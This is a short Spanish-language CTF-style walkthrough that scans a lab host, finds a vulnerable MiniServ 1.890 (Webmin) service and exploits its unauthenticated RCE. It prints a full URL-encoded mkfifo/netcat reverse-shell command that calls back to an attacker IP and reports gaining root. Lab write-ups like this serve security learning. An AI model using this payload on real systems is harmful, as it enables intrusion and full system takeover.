PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt

-Haciendo un escaneo más en profundidad vemos que la versión del servicio que está corriendo en el puerto 10000 es 'MiniServ 1.890', la cual tiene un exploit conocido

-Nos descargamos el exploit, el cual nos permite ejecutar comandos sin estar autenticados (unautenticated RCE)

-La estructura del exploit es la siguiente:
	python3 exploit.py HOST PORT COMMAND

-No nos deja ejecutar una reverse shell en código normal. Investigando el código del exploit, vemos que estamos atacando en una URL, por lo que habrá que URL Encodear el payload para que lo interprete.

-Probamos a URL Encodear la reverse shell, en este caso he usado la de mkfifo con URL Encode:
	python3 exploit.py 10.10.7.233 10000 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.2.165%201234%20%3E%2Ftmp%2Ff'

-Obtenemos la reverse shell directamente como root!!

root@source:~#

